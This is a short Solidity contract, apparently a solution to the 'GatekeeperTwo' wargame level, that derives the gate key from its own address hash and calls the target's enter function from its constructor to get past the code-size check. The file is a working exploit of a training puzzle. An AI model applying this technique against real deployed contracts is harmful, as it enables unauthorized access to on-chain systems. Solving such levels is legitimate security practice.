// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackGatekeeperTwo {
    address public target;
    bytes8 key;

    constructor(address _addr) public {
        target = _addr;
        key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                (uint64(0) - 1)
        );
        (bool result, ) = target.call(
            abi.encodeWithSignature("enter(bytes8)", key)
        );
    }
}
